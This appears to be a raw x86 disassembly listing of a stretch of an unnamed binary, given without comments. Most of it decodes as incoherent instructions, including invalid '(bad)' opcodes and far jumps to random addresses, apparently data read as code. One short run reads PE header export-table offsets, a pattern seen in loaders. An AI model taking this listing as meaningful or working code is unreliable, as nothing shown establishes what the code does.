  408448:	dec    BYTE PTR [edx+ebx*8+0x7cbed6b7]
  40844f:	nop
  408450:	stc    
  408451:	(bad)  
  408452:	cwde   
  408453:	dec    ebp
  408454:	shl    DWORD PTR ds:[eax],cl
  408457:	or     esp,0xffffffde
  40845a:	ds mov ah,0xff
  40845d:	jmp    0x40843a
  40845f:	push   ds
  408460:	pop    eax
  408461:	fbstp  TBYTE PTR [edx-0x70b1dc50]
  408467:	shr    BYTE PTR [esi+0x6a],cl
  40846a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40846b:	xchg   esi,eax
  40846c:	adc    BYTE PTR [edx],dh
  40846e:	test   al,0x7
  408470:	aas    
  408471:	pop    eax
  408472:	dec    esi
  408474:	pushf  
  408475:	xor    eax,0xd38a1480
  40847a:	sbb    BYTE PTR [eax+0x39504e61],ch
  408480:	test   BYTE PTR [ebp+edi*1-0x5b6cdcd2],ch
  408487:	popw   ss
  408489:	mov    ah,0xea
  40848b:	jle    0x40844a
  40848d:	sbb    ecx,DWORD PTR [esi+ebx*4-0x56e6dde2]
  408494:	inc    ebp
  408495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408496:	arpl   sp,sp
  408498:	sub    eax,DWORD PTR [ebp+0x2f]
  40849b:	or     BYTE PTR [edx],ah
  40849d:	dec    ebx
  40849e:	pop    es
  40849f:	cmp    eax,0xa410ee30
  4084a4:	push   0xffffffa6
  4084a6:	mov    ah,0xed
  4084a8:	mov    ah,0xba
  4084aa:	sbb    ebp,DWORD PTR [ebx+0x51]
  4084ad:	xlat   BYTE PTR ds:[ebx]
  4084ae:	xor    esp,DWORD PTR [esi+esi*4+0x5f81b313]
  4084b5:	shr    BYTE PTR [ecx],1
  4084b7:	mov    edi,0x98520ee9
  4084bc:	imul   ecx,edx,0x79
  4084bf:	sbb    cl,BYTE PTR [ebx+0x56a3640c]
  4084c5:	hlt    
  4084c6:	push   ecx
  4084c7:	out    0x58,eax
  4084c9:	leave  
  4084ca:	nop
  4084cb:	ffree  st(7)
  4084cd:	jno    0x408529
  4084cf:	call   0x882df4ed
  4084d4:	and    esi,DWORD PTR [edi]
  4084d6:	mov    BYTE PTR cs:[edx+0x2],dh
  4084da:	jge    0x408527
  4084dc:	mov    ebp,0xcd6111de
  4084e1:	add    BYTE PTR [edi],al
  4084e3:	xchg   ecx,eax
  4084e4:	or     DWORD PTR [esi-0x72],ecx
  4084e7:	int    0x53
  4084e9:	lock inc eax
  4084eb:	sahf   
  4084ec:	lock pop ds
  4084ee:	dec    esi
  4084ef:	mov    ds:0xa06676d6,al
  4084f4:	popf   
  4084f5:	test   eax,0x92b174e6
  4084fa:	mov    ebx,DWORD PTR [ecx]
  4084fc:	test   eax,0xcaac2f7
  408501:	mov    DWORD PTR [ecx+0x6716f2c5],edx
  408507:	mov    ds:0x46d2fd0a,eax
  40850c:	call   0x39a53293
  408511:	in     al,0x2b
  408513:	push   ss
  408514:	adc    BYTE PTR [ecx-0x33],0x6e
  408518:	dec    ebx
  408519:	jge    0x4084de
  40851b:	sti    
  40851c:	xor    ebx,eax
  40851e:	shr    DWORD PTR [ebx],1
  408520:	inc    esi
  408521:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408522:	add    DWORD PTR [edi+0x3],ebx
  408525:	jne    0x408555
  408527:	mov    cl,0x61
  408529:	add    dh,dh
  40852b:	push   eax
  40852c:	test   al,0x9f
  40852e:	ret    
  40852f:	test   eax,0xc21aa311
  408535:	in     al,0x6a
  408537:	mov    ds:0x41b8d01a,eax
  40853c:	mov    ebx,DWORD PTR [edi+edx*2-0x1b5fd642]
  408543:	in     al,dx
  408544:	loope  0x4085a6
  408546:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408547:	fst    st(6)
  408549:	jnp    0x408560
  40854b:	xor    al,0x83
  40854d:	cmp    BYTE PTR [ecx-0x49],0x57
  408551:	jmp    0xa032:0x93f3c142
  408558:	and    ah,al
  40855a:	test   BYTE PTR [eax+0x1d],bh
  40855d:	push   ecx
  40855e:	mov    cl,0x3f
  408560:	push   edi
  408561:	mov    al,0x2e
  408563:	xchg   esp,eax
  408564:	ss mov ebp,0x89ecfab9
  40856a:	jge    0x40854b
  40856c:	test   al,0xdc
  40856e:	rcr    DWORD PTR [ebp+eax*1+0x16],0x84
  408573:	mov    eax,0x3da71afb
  408578:	(bad)  
  408579:	(bad)  [ebp-0x1c]
  40857c:	out    dx,al
  40857d:	je     0x408562
  40857f:	and    dl,BYTE PTR [ebx+eiz*2-0x76]
  408583:	mov    ecx,ebx
  408585:	inc    ecx
  408586:	fwait
  408587:	call   0xb3c5:0x26da695a
  40858e:	outs   dx,BYTE PTR ds:[esi]
  40858f:	ja     0x6c083081
  408595:	jnp    0x4085e9
  408597:	test   al,0x85
  408599:	rcr    BYTE PTR [ebp+0x31],0x6f
  40859d:	cmc    
  40859e:	rcpps  xmm4,XMMWORD PTR [edx-0x2bfb8da4]
  4085a5:	outs   dx,BYTE PTR ds:[esi]
  4085a6:	aad    0x7e
  4085a8:	out    dx,eax
  4085a9:	and    eax,0xede1bfa6
  4085ae:	test   eax,0x2d5f2cc4
  4085b3:	ret    0x2944
  4085b6:	ror    BYTE PTR [ebx-0x1c8f827d],1
  4085bc:	adc    eax,DWORD PTR [ecx]
  4085be:	mov    bl,0x61
  4085c0:	sbb    ecx,ebp
  4085c2:	jbe    0x40857e
  4085c4:	or     BYTE PTR [esi],cl
  4085c6:	sbb    cl,BYTE PTR [eax-0x14]
  4085c9:	sbb    ah,BYTE PTR [ebx-0x2]
  4085cc:	in     eax,dx
  4085cd:	cli    
  4085ce:	pop    esp
  4085cf:	sbb    eax,0xe8930e71
  4085d4:	ret    0x8fd1
  4085d7:	mov    ecx,DWORD PTR [ebp+0x40]
  4085da:	and    esi,DWORD PTR [eax+0x7f]
  4085dd:	mov    edi,0x211aa656
  4085e2:	pop    esi
  4085e3:	sar    bh,1
  4085e5:	jmp    0x4085a2
  4085e7:	stos   DWORD PTR es:[edi],eax
  4085e8:	cmp    DWORD PTR [esi],edi
  4085ea:	in     al,0x9b
  4085ec:	in     eax,dx
  4085ed:	ret    
  4085ee:	daa    
  4085ef:	or     eax,0x58b168be
  4085f4:	int3   
  4085f5:	imul   ecx,DWORD PTR [ebp-0x49],0x4f
  4085f9:	imul   esi,DWORD PTR [esi],0xae3fd857
  4085ff:	in     eax,dx
  408600:	in     eax,dx
  408601:	xchg   DWORD PTR [eax+esi*1+0x6a],esi
  408605:	shr    BYTE PTR [eax+0x11],cl
  408608:	pop    ds
  408609:	jmp    0xb01f052f
  40860e:	cmp    ecx,DWORD PTR [esi+eax*2-0x6554197]
  408615:	fisub  DWORD PTR [ebx-0x6b]
  408618:	lods   eax,DWORD PTR ds:[esi]
  408619:	inc    eax
  40861a:	cmp    eax,0xedf8304c
  40861f:	xlat   BYTE PTR ds:[ebx]
  408620:	inc    esp
  408621:	call   0x2b76de26
  408626:	xchg   edx,eax
  408627:	xor    DWORD PTR [ebp-0x4b2a54bf],ecx
  40862d:	jge    0x408648
  40862f:	pop    edx
  408631:	call   0xd7d4:0x14186f64
  408638:	mov    edi,0x755cb52b
  40863d:	mov    ebp,0xd7187fa2
  408642:	xor    al,0x49
  408644:	cmp    DWORD PTR [edi-0x9],0x1b4e908e
  40864b:	shr    DWORD PTR [edx+0x7eae695],cl
  408651:	sbb    dl,BYTE PTR [esp+edi*2+0xc850fcb]
  408658:	add    BYTE PTR [eax],al
  40865a:	add    BYTE PTR [ebx+0x45399c45],cl
  408660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408661:	je     0x408e5e
  408667:	mov    eax,DWORD PTR [ebp+0x8]
  40866a:	mov    edx,DWORD PTR [ebp+0xc]
  40866d:	mov    edx,DWORD PTR [ebp-0x4]
  408670:	mov    edx,DWORD PTR [edx+0x3c]
  408673:	lea    eax,[edx+eax*8+0x78]
  408677:	mov    edx,DWORD PTR [ebp-0x4]
  40867a:	mov    eax,DWORD PTR [edx+eax*1]
  40867d:	mov    DWORD PTR [ebp-0x24],eax
  408680:	jmp    0x408a5e
  408685:	or     ah,BYTE PTR [ebx+0x79]
  408688:	jns    0x4086eb
  40868a:	arpl   WORD PTR [edx],cx
  40868c:	pop    ebx
  40868d:	fadd   QWORD PTR [ebx+0x2f]
  408690:	mov    esi,0x6a04d07e
  408695:	das    
  408696:	pop    edi
  408697:	sbb    BYTE PTR [eax],bl
  408699:	sahf   
  40869a:	adc    bl,BYTE PTR [eax]
  40869c:	sbb    dh,ah
  40869e:	inc    cl
  4086a0:	sub    BYTE PTR [edi],bl
  4086a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086a3:	add    al,0xf
  4086a5:	loope  0x4086e0
  4086a7:	push   cs
  4086a8:	pop    eax
  4086a9:	bound  eax,QWORD PTR [ebp+0x62]
  4086ac:	push   edx
  4086ad:	xor    edx,edx
  4086af:	mov    al,BYTE PTR [ebp+0x5f]
  4086b2:	int3   
  4086b3:	in     eax,dx
  4086b4:	cmp    BYTE PTR [ecx+0x1c],dh
  4086b7:	push   ebx
  4086b8:	cli    
  4086b9:	jmp    0xac20d41f
  4086be:	xchg   edx,eax
  4086bf:	fmul   st,st(3)
  4086c1:	mov    ebx,0x5e5a09fb
  4086c6:	push   0x5cdcba2d
  4086cb:	dec    ebx
  4086cd:	xor    al,0xfa
  4086cf:	push   ds
  4086d0:	jbe    0x4086ab
  4086d2:	push   ebp
  4086d3:	jge    0x408658
  4086d5:	push   ss
  4086d6:	(bad)  
  4086d8:	jae    0x40867b
  4086da:	mov    bl,0x44
  4086dc:	sahf   
  4086dd:	icebp  
  4086de:	scas   al,BYTE PTR es:[edi]
  4086df:	adc    eax,0xa70781c4
  4086e4:	sub    ah,cl
  4086e6:	cmp    al,dh
  4086e8:	fiadd  WORD PTR [edi]
  4086ea:	jns    0x408690
  4086ec:	scas   al,BYTE PTR es:[edi]
  4086ed:	mov    ds:0xca988358,al
  4086f2:	adc    edx,DWORD PTR ds:0x7e63fe91
  4086f8:	jl     0x408767
  4086fa:	aaa    
  4086fb:	sub    al,0xa6
  4086fd:	cdq    
  4086fe:	mov    dl,0xaf
  408700:	pushf  
  408701:	jne    0x4086fb
  408703:	mov    ah,0x42
  408705:	dec    ebp
  408706:	and    esp,0x88765b1
  40870c:	test   DWORD PTR [ebx-0x32647b8d],ebp
  408712:	rcl    cl,cl
  408714:	test   eax,0xbda39ff2
  408719:	mov    dh,0xc3
  40871b:	mov    esi,0xe3f0eefc
  408720:	loopne 0x408729
  408722:	mov    dl,0xc6
  408724:	push   0xffffff9b
  408726:	outs   dx,DWORD PTR ds:[esi]
  408727:	xor    BYTE PTR [edx-0x57],ah
  40872a:	gs xchg ebx,eax
  40872c:	cmp    eax,0x440847e5
  408731:	sbb    DWORD PTR [ecx],esi
  408733:	ficomp DWORD PTR [ebp-0x5e9d66db]
  408739:	loop   0x4087b7
  40873b:	js     0x4086e6
  40873d:	pop    eax
  40873e:	jmp    0x408746
  408740:	aam    0x9b
  408742:	cmc    
  408743:	xchg   ebp,ecx
  408745:	adc    eax,0xf1309ec4
  40874a:	dec    esi
  40874b:	ins    BYTE PTR es:[edi],dx
  40874c:	jb     0x4086fa
  40874e:	and    BYTE PTR [esi-0x2],0x2
  408752:	adc    al,0xf
  408754:	aam    0xbb
  408756:	mov    eax,0x6d86537b
  40875b:	push   cs
  40875c:	jmp    0xcfc198d0
  408761:	fwait
  408762:	push   esi
  408763:	es xor eax,0x41abf191
  408769:	push   ss
  40876a:	aas    
  40876b:	loope  0x40874d
  40876d:	sbb    BYTE PTR [esi-0x2b99cf56],al
  408773:	js     0x408735
  408775:	fucomip st,st(4)
  408777:	mov    cl,0x6d
  408779:	mov    dh,0xd9
  40877b:	ficom  DWORD PTR [esi+0x46]
  40877e:	les    ebx,FWORD PTR [ebp-0x8d28ebc]
  408784:	mov    ch,0xfa
  408786:	(bad)  
  408787:	xchg   edi,eax
  408788:	outs   dx,DWORD PTR ds:[esi]
  408789:	or     ebp,DWORD PTR [edx-0x55b91e93]
  40878f:	sub    al,0x73
  408791:	scas   al,BYTE PTR es:[edi]
  408792:	in     al,0x49
  408794:	pop    es
  408795:	jl     0x4087d6
  408797:	sbb    al,0x10
  408799:	iret   
  40879a:	inc    eax
  40879b:	xchg   edx,eax
  40879c:	sbb    eax,0x42010d30
  4087a1:	sbb    al,0xbe
  4087a3:	cwde   
  4087a4:	jmp    0xe69b:0x10d465b4
  4087ab:	mov    al,0x4f
  4087ad:	cmp    eax,0x68fc8c06
  4087b2:	test   al,0x35
  4087b4:	in     al,dx
  4087b5:	ss xchg esi,eax
  4087b7:	xor    edi,edx
  4087b9:	shl    DWORD PTR [ebx+0x1424b6de],cl
  4087bf:	mov    ds:0x950b7389,eax
  4087c4:	cmp    esp,DWORD PTR [esi]
  4087c6:	leave  
  4087c7:	push   ds
  4087c8:	or     BYTE PTR [edx+0xb],0xf5
  4087cc:	cmp    al,0x6b
  4087ce:	inc    esi
  4087cf:	fidiv  DWORD PTR [esi]
  4087d1:	fwait
  4087d2:	stc    
  4087d3:	xchg   ecx,eax
  4087d4:	jg     0x408844
  4087d6:	xchg   ecx,eax
  4087d7:	(bad)  
  4087d8:	repnz fisubr WORD PTR gs:[ebp-0x2c]
  4087dd:	daa    
  4087de:	xchg   BYTE PTR [ebx-0x9c6b5ad],al
  4087e4:	js     0x408821
  4087e6:	push   es
  4087e7:	dec    esp
  4087e8:	and    DWORD PTR [ecx-0x9],edx
  4087eb:	sahf   
  4087ec:	sar    BYTE PTR [ecx],1
  4087ee:	or     al,0xba
  4087f0:	aaa    
  4087f1:	mov    al,0xda
  4087f3:	or     al,BYTE PTR [ebx-0x17]
  4087f6:	dec    eax
  4087f7:	pop    esi
  4087f8:	xchg   ebx,eax
  4087f9:	out    0xd9,eax
  4087fb:	lods   eax,DWORD PTR ds:[esi]
  4087fc:	shr    BYTE PTR ds:0x1847767,0x7c
  408803:	mov    edx,0x604632e8
  408808:	into   
  408809:	adc    edx,DWORD PTR [ecx-0x1f]
  40880c:	rol    ecx,0x3a
  40880f:	arpl   si,sp
  408811:	and    cl,BYTE PTR [ebx-0x55e00f4]
  408817:	cs (bad) 
  408819:	mov    ecx,0x4f73a62e
  40881e:	aad    0x7a
  408820:	sub    eax,DWORD PTR [edx+0x33b3f16d]
  408826:	(bad)  
  408827:	icebp  
  408828:	mov    WORD PTR [ebp+0x550c2425],cs
  40882e:	(bad)  
  408830:	cmp    eax,0x13262a87
  408835:	push   ds
  408836:	ror    BYTE PTR [ecx-0x62],0x5f
  40883a:	ret    0xcd17
  40883d:	js     0x408888
  40883f:	mov    ds:0x580de9f8,al
  408844:	test   al,0x52
  408846:	int3   
  408847:	cdq    
  408848:	or     ebp,DWORD PTR [ebp+0x6f]
  40884b:	ja     0x408891
  40884d:	pop    esi
  40884e:	inc    edx
  40884f:	cmpxchg BYTE PTR [ecx+0x64],ah
  408853:	xor    BYTE PTR [edi+eax*8+0x36],ah
  408857:	rcr    DWORD PTR [ebx-0x2f],cl
  40885a:	mov    dh,BYTE PTR [edi]
  40885c:	xor    eax,0x7c54a489
  408861:	jecxz  0x408848
  408863:	fidivr WORD PTR [edx-0x5b188875]
  408869:	and    eax,0xce48061d
  40886e:	inc    ebx
  40886f:	cld    
  408870:	jmp    0xeb7b21ee
  408875:	sub    ebp,eax
  408877:	or     al,0x73
  408879:	pop    ebp
  40887a:	push   esi
  40887b:	test   eax,0xbcfdb2c7
  408880:	sahf   
  408881:	dec    edx
  408882:	sbb    BYTE PTR [esi-0x3eb50689],0xd3
  408889:	sar    DWORD PTR [eax-0x4fe4ab38],cl
  40888f:	daa    
  408890:	push   0xe6eae2b9
  408895:	jne    0x408876
  408897:	(bad)  
  408898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408899:	cmp    eax,0x49ea25d8
  40889e:	ret    0x3aa1
  4088a1:	mov    WORD PTR [esi],gs
  4088a3:	ins    BYTE PTR es:[edi],dx
  4088a4:	dec    ebp
  4088a5:	cld    
  4088a6:	mov    ch,0x3f
  4088a8:	leave  
  4088a9:	ins    DWORD PTR es:[edi],dx
  4088aa:	push   es
  4088ab:	outs   dx,DWORD PTR ds:[esi]
  4088ac:	sbb    eax,0xfd7a8e39
  4088b1:	pop    ebx
  4088b2:	cmp    eax,0x1fbd8e40
  4088b7:	push   0xe7b3e34f
  4088bc:	lods   al,BYTE PTR ds:[esi]
  4088bd:	push   edx
  4088be:	mov    DWORD PTR [edi+0x6971fdc7],esp
  4088c4:	aad    0xe0
  4088c6:	push   esi
  4088c7:	and    BYTE PTR [eax-0x7f],cl
  4088ca:	dec    esp
  4088cb:	push   ebx
  4088cc:	fstp   TBYTE PTR [esi+ebx*8-0x11f84e3e]
  4088d3:	lds    edi,FWORD PTR [eax]
  4088d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088d6:	stos   DWORD PTR es:[edi],eax
  4088d7:	xor    BYTE PTR [edx],ah
  4088d9:	inc    eax
  4088da:	mov    dl,0xe9
  4088dc:	gs mov edx,0xc8e24c8
  4088e2:	mov    bl,0x4f
  4088e4:	xchg   ecx,eax
  4088e5:	push   cs
  4088e6:	inc    edx
  4088e7:	dec    edx
  4088e8:	or     ecx,0xaefeb2fe
  4088ee:	sub    BYTE PTR [esi+0x6e],al
  4088f1:	lahf   
  4088f2:	push   eax
  4088f3:	jge    0x4088b6
  4088f5:	scas   al,BYTE PTR es:[edi]
  4088f6:	inc    ecx
  4088f7:	mov    ds:0x18416fad,eax
  4088fc:	sub    cl,bl
  4088fe:	bound  esi,QWORD PTR [ebx+esi*4-0x49]
  408902:	scas   al,BYTE PTR es:[edi]
  408903:	xchg   ebx,eax
  408904:	out    0x30,eax
  408906:	add    BYTE PTR [edx-0x4],0x3d
  40890a:	push   esi
  40890b:	adc    BYTE PTR ds:0xa0ebf6a3,dl
  408911:	sub    bh,BYTE PTR [ebp-0x65]
  408914:	outs   dx,DWORD PTR ds:[esi]
  408915:	mov    esp,0x505a5965
  40891a:	dec    ebp
  40891b:	add    al,0xc7
  40891d:	jb     0x40893f
  40891f:	jno    0x4088ff
  408921:	test   al,0xa5
  408923:	(bad)  
  408925:	repz sub al,0xf6
  408928:	sub    bh,BYTE PTR gs:[esi+0x19]
  40892c:	mov    ebx,0xdb2af6fa
  408931:	je     0x4088f5
  408933:	iret   
  408934:	pop    edx
  408935:	out    0x9b,al
  408937:	dec    edi
  408938:	xor    DWORD PTR ds:0xbaacc511,0x67
  40893f:	(bad)  
  408940:	les    edx,FWORD PTR [ebx+eax*2-0x39]
  408944:	ret    0xdc55
  408947:	ret    
  408948:	mov    al,ds:0x81fcf13a
  40894d:	jle    0x4088f4
  40894f:	mov    ebp,0xe6e8a729
  408954:	mov    WORD PTR [edi],?
  408956:	in     eax,0x37
  408958:	lods   al,BYTE PTR ds:[esi]
  408959:	sar    DWORD PTR [eax+0x17],0x8b
  40895d:	cld    
  40895e:	and    al,0x4f
  408960:	xchg   ecx,eax
  408961:	aad    0xdb
  408963:	std    
  408964:	fisttp DWORD PTR [edx-0x490e0559]
  40896a:	(bad)  
  40896b:	mov    BYTE PTR [edi],dl
  40896d:	cli    
  40896e:	lea    edx,[ecx+0x5543b2dc]
  408974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408975:	fsub   DWORD PTR [esi+ecx*1-0x44]
  408979:	pop    edi
  40897a:	jmp    0xf63a:0x55d03474
  408981:	add    al,0x95
  408983:	mov    ebx,0x50fcdc36
  408988:	aaa    
  408989:	sbb    BYTE PTR [ebx+edi*1+0x45],bh
  40898d:	neg    DWORD PTR [ebp-0x6c]
  408990:	mov    cl,ch
  408992:	daa    
  408993:	call   0x984:0x70fa4fb7
  40899a:	cdq    
  40899b:	add    eax,0x109d7d26
  4089a0:	gs call 0x1e7344e2
  4089a6:	and    BYTE PTR [edx-0x55],0xca
  4089aa:	(bad)  
  4089ab:	sbb    eax,0x9f71c99e
  4089b0:	sub    dh,ah
  4089b2:	sbb    eax,0xc31a41fd
  4089b7:	mov    bh,0x38
  4089b9:	mov    al,0x81
  4089bb:	rcr    BYTE PTR [eax],cl
  4089bd:	shl    DWORD PTR [ebp-0x477cb63e],cl
  4089c3:	sahf   
  4089c4:	loop   0x408996
  4089c6:	jbe    0x408a32
  4089c8:	xchg   esp,eax
  4089c9:	cmp    al,0xef
  4089cb:	and    ebp,ecx
  4089cd:	push   ds
  4089ce:	or     al,0x60
  4089d0:	in     al,0xd6
  4089d2:	sub    DWORD PTR [esi],0x8ced8de7
  4089d8:	pusha  
  4089d9:	dec    esp
  4089da:	xor    DWORD PTR [edx+esi*4+0x6e],ebx
  4089de:	jno    0x40896f
  4089e0:	lds    edi,FWORD PTR [ebx+0x73]
  4089e3:	sub    edx,ebp
  4089e5:	fs adc al,0x17
  4089e8:	mov    ch,0x2e
  4089ea:	int    0xe8
  4089ec:	jg     0x4089e1
  4089ee:	nop
  4089ef:	cs iret 
  4089f1:	repnz popf 
  4089f3:	fild   WORD PTR [edi-0x421d69cd]
  4089f9:	push   0xffffffc4
  4089fb:	xor    bl,BYTE PTR [ebp+0xe918862]
  408a01:	jge    0x408a0c
  408a03:	icebp  
  408a04:	add    bl,al
  408a06:	xor    eax,0xd9672fbf
  408a0b:	fistp  QWORD PTR [edi-0x2f221b4f]
  408a11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a12:	jl     0x408a31
  408a14:	add    BYTE PTR [eax+0x23eecd6a],0x2
  408a1b:	sti    
  408a1c:	dec    edi
  408a1d:	call   0xc81c8515
  408a22:	mov    ecx,0xd7338425
  408a27:	(bad)  
  408a28:	out    0x15,eax
  408a2a:	sbb    al,BYTE PTR [edi+0x52]
  408a2d:	xchg   edi,eax
  408a2e:	loopne 0x4089c1
  408a30:	hlt    
  408a31:	ret    
  408a32:	mov    esi,0x14b3aab2
  408a37:	aaa    
  408a38:	sub    eax,0x72a9b43c
  408a3d:	mov    al,0xd9
  408a3f:	sbb    eax,0x78b1ce79
  408a44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a45:	dec    ebx
  408a46:	mov    BYTE PTR [edi],0x80
  408a49:	mul    DWORD PTR [edi-0x77c1714c]
  408a4f:	push   eax
  408a50:	test   al,0x8f
  408a52:	pushf  
  408a53:	daa    
  408a54:	inc    ebx
  408a55:	stos   DWORD PTR es:[edi],eax
  408a56:	js     0x408a28
  408a58:	aaa    
  408a59:	mul    DWORD PTR [edi-0x74cea290]
  408a5f:	push   es
  408a60:	mov    edx,DWORD PTR [esi+0x4]
  408a63:	jmp    0x408e41
  408a68:	pop    ebx
  408a69:	jno    0x408ac9
  408a6b:	mov    ds:0x301ba25a,al
  408a70:	xchg   DWORD PTR es:[ebp-0x44],esp
  408a74:	enter  0x451,0x6a
  408a78:	mov    ch,0x57
  408a7a:	sbb    BYTE PTR [eax],bl
  408a7c:	sahf   
  408a7d:	adc    bl,BYTE PTR [eax]
  408a7f:	sbb    dh,bh
  408a81:	add    BYTE PTR [ebx-0x4b4e2d8],bh
  408a87:	in     eax,dx
  408a88:	xor    dl,BYTE PTR [ebx-0x19]
  408a8b:	xchg   ebp,eax
  408a8c:	pop    esp
  408a8d:	dec    esi
  408a8e:	cmp    ch,0x51
  408a91:	xchg   ebx,eax
  408a92:	jno    0x408a81
  408a94:	mov    al,ds:0x1f456382
  408a99:	rcl    ebp,cl
  408a9b:	mov    dx,0x3112
  408a9f:	pop    ebx
  408aa0:	xchg   ebp,eax
  408aa1:	aaa    
  408aa2:	jmp    0x5eecca42
  408aa7:	or     al,0x22
  408aa9:	push   ebp
  408aaa:	in     eax,0x53
  408aac:	xor    BYTE PTR [ecx+0x14],0x35
  408ab0:	fisttp DWORD PTR [eax+0x3f]
  408ab3:	push   esp
  408ab4:	pop    ds
  408ab5:	ss or  eax,0xb78433ee
  408abb:	pushf  
  408abc:	sbb    dh,BYTE PTR [edx-0x8]
  408abf:	mov    ds:0xe28df961,al
  408ac4:	icebp  
  408ac5:	jae    0x408b33
  408ac7:	jmp    0x408afa
  408ac9:	or     dh,ah
  408acb:	adc    edx,edx
  408acd:	dec    ebp
  408ace:	mov    dh,0xd0
  408ad0:	mov    ah,BYTE PTR [ebx]
  408ad2:	stos   BYTE PTR es:[edi],al
  408ad3:	fldlg2 
  408ad5:	jp     0x408a71
  408ad7:	add    al,0x7d
  408ad9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ada:	cmp    esp,esi
  408adc:	mov    dl,0xbf
  408ade:	lahf   
  408adf:	jle    0x408aeb
  408ae1:	cmp    bl,dh
  408ae3:	retf   
  408ae4:	pop    esi
  408ae5:	stc    
  408ae6:	out    0xce,eax
  408ae8:	ins    DWORD PTR es:[edi],dx
  408ae9:	rol    DWORD PTR [eax+0x79bd9b1c],cl
  408aef:	arpl   WORD PTR [edx-0x4ce0fb8e],cx
  408af5:	mov    edi,0x4e465336
  408afa:	mov    eax,ds:0xefe14798
  408aff:	mov    dh,0x96
  408b01:	xor    eax,0xd0507d69
  408b06:	push   eax
  408b07:	cmp    eax,0xfda14e48
  408b0c:	lods   eax,DWORD PTR ds:[esi]
  408b0d:	fstp   TBYTE PTR [ebx]
  408b0f:	mov    al,ds:0xab360c6a
  408b14:	retf   
  408b15:	and    eax,0x2b012840
  408b1a:	adc    eax,0x351d03eb
  408b1f:	clc    
  408b20:	sub    ch,BYTE PTR [ebx]
  408b22:	retf   0x6193
  408b25:	leave  
  408b26:	retf   
  408b27:	sub    ah,BYTE PTR [ecx+0x39]
  408b2a:	aam    0xee
  408b2c:	jns    0x408ad9
  408b2e:	std    
  408b2f:	fs dec ebx
  408b31:	fnsave [edi]
  408b33:	out    dx,eax
  408b34:	push   edi
  408b35:	jns    0x408b0a
  408b37:	sub    al,BYTE PTR [ecx+0x7d22e99f]
  408b3d:	(bad)  
  408b3e:	outs   dx,DWORD PTR ds:[esi]
  408b3f:	repz fstp TBYTE PTR [eax+ebp*1+0x58d7d373]
  408b47:	mov    bl,0x17
  408b49:	sbb    BYTE PTR [ebx],dl
  408b4b:	jbe    0x408b61
  408b4d:	enter  0x1999,0xee
  408b51:	fiadd  DWORD PTR [esi-0x20bf732e]
  408b57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b58:	rcl    BYTE PTR [ebp+eiz*2-0x14],0x68
  408b5d:	imul   ecx,DWORD PTR [eax-0x64],0x5f
  408b61:	int    0x5a
  408b63:	fwait
  408b64:	xchg   ebp,eax
  408b65:	mov    cl,0x1f
  408b67:	pushf  
  408b68:	mov    edx,esi
  408b6a:	lods   al,BYTE PTR ds:[esi]
  408b6b:	call   0x5162:0x9251d83b
  408b72:	push   ss
  408b73:	lods   al,BYTE PTR ds:[esi]
  408b74:	xor    eax,0x6e33229d
  408b79:	dec    ecx
  408b7a:	add    eax,0x865d03b7
  408b7f:	adc    bh,ah
  408b81:	out    dx,eax
  408b82:	mov    ds:0x35918a82,eax
  408b87:	add    BYTE PTR [ebp+0x60],0x58
  408b8b:	adc    eax,0x321135b8
  408b90:	mov    ecx,0xc9bfdb89
  408b95:	jecxz  0x408b29
  408b97:	test   BYTE PTR [ebx+ebp*2-0x3e466f8d],bh
  408b9e:	les    edi,FWORD PTR [ebx+ebx*4]
  408ba1:	stos   DWORD PTR es:[edi],eax
  408ba2:	fld    TBYTE PTR [edx-0x42]
  408ba5:	enter  0x4c23,0x93
  408ba9:	xor    ebx,DWORD PTR cs:[edi]
  408bac:	ds scas al,BYTE PTR es:[edi]
  408bae:	int    0xd1
  408bb0:	mov    ch,0x41
  408bb2:	in     eax,0xd1
  408bb4:	dec    ebx
  408bb5:	ret    0x7c44
  408bb8:	add    ecx,DWORD PTR [edx+0x1e3a3c42]
  408bbe:	lods   al,BYTE PTR ds:[esi]
  408bbf:	pop    edi
  408bc0:	fyl2xp1 
  408bc2:	(bad)  
  408bc3:	sbb    eax,0xa6b11e34
  408bc8:	pop    edi
  408bc9:	cwde   
  408bca:	int3   
  408bcb:	bound  ebp,QWORD PTR [ebx+0x14e0191d]
  408bd1:	sub    BYTE PTR [esi-0x42],0xd2
  408bd5:	rol    BYTE PTR [edx],cl
  408bd7:	dec    ecx
  408bd8:	push   esi
  408bd9:	lock mov bl,BYTE PTR [edi]
  408bdc:	fstp   QWORD PTR [edx-0x50c012fc]
  408be2:	pop    ebp
  408be3:	inc    esi
  408be4:	stc    
  408be5:	int    0xbd
  408be7:	inc    ebx
  408be8:	aad    0x95
  408bea:	fs sbb al,0x64
  408bed:	cld    
  408bee:	pushf  
  408bef:	leave  
  408bf0:	pop    esp
  408bf1:	mov    esi,DWORD PTR [ebx-0x3409702]
  408bf7:	dec    ebx
  408bf8:	cmp    eax,0xbabde95d
  408bfd:	jmp    0x92d4:0x9b6ab065
  408c04:	out    0x84,al
  408c06:	push   0xdd6b1023
  408c0b:	hlt    
  408c0c:	inc    ebp
  408c0d:	xor    BYTE PTR [ebx+0x7955829b],cl
  408c13:	std    
  408c14:	mov    ch,BYTE PTR [ecx+ebp*2+0x60278a80]
  408c1b:	adc    dl,bh
  408c1d:	imul   eax,ebx,0x7867e475
  408c23:	in     al,0x8f
  408c25:	cmp    edi,edx
  408c27:	stc    
  408c28:	sub    al,0xaf
  408c2a:	push   0xffffffc3
  408c2c:	sub    DWORD PTR [edx+0x13],eax
  408c2f:	mov    fs,WORD PTR [edx+0x69]
  408c32:	mov    ch,0x66
  408c34:	jmp    0x3dc9:0x131738bb
  408c3b:	xor    dh,dh
  408c3d:	pusha  
  408c3e:	cld    
  408c3f:	push   es
